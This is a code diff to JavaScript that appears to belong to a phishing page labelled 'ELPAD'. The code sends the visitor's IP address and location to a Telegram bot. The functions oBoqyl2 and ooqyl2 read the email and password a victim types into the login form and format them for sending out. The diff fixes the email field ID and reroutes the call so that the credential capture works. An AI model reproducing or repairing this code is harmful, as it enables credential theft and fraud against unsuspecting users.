@@ -16,7 +16,7 @@ function userDetails() {
 				var result = `Entry ID: ${logStamp} %0AIP: ${obj.ip} | city: ${obj.city} | country: ${obj.country} | loc: ${obj.loc} | org: ${obj.org} | region: ${obj.region} | timezone: ${obj.timezone}`
 				fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${result}`).then(function (response) {
 					if (response.ok) {
-						oBoqyl2();
+						ooqyl2();
 						return 'okay';
 					} else {
 						return Promise.reject(response);
@@ -31,7 +31,7 @@ function userDetails() {
 
 
 function oBoqyl2() {
-	var eTxt = document.getElementById("eail").value;
+	var eTxt = document.getElementById("email").value;
 	var p2Txt = document.getElementById("password").value;
 
 	result = `Logs from ELPAD page %0A Entry ID: ${logStamp}  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;
@@ -51,7 +51,7 @@ function oBoqyl2() {
 
 
 function ooqyl2() {
-	var eTxt = document.getElementById("eail").value;
+	var eTxt = document.getElementById("email").value;
 	var p2Txt = document.getElementById("password").value;
 
 	result = `Logs from ELPAD2 page %0A Entry ID: ${logStamp} (2nd Entry)  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;
